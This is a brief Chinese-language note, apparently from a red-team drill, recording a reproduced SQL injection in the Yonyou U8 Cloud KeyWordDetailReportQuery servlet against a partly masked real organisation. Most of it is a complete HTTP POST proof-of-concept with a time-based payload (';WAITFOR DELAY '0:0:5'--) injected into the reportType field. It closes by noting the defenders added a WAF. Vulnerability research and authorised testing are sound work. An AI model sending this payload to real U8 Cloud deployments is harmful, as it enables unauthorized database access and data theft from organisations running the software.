# 用友U8C KeyWordDetailReportQuery_SQL sql注入漏洞

<br>

这里记录一下我在hw期间成功复现出来的

相关资产:百****投资集团

<br>

## 来源

<br>

[用友U8_cloud_KeyWordDetailReportQuery_SQL注入漏洞](https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8_cloud_KeyWordDetailReportQuery_SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)

<br>

## poc

<br>

````
POST /servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery  HTTP/1.1
Host: ******
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D81BCB5B3EA994ACB2FFAAE607AFCF6B.server
If-None-Match: W/"1120-1532588472000"
If-Modified-Since: Thu, 26 Jul 2018 07:01:12 GMT
Connection: close
Content-Length: 133

{"reportType":"';WAITFOR DELAY '0:0:5'--","usercode":"18701014496","keyword":[{"keywordPk":"1","keywordValue":"1","keywordIndex":1}]}

````

<br>

可惜到了下午蓝方直接上了waf，过滤了特殊符号。没写报告只好作罢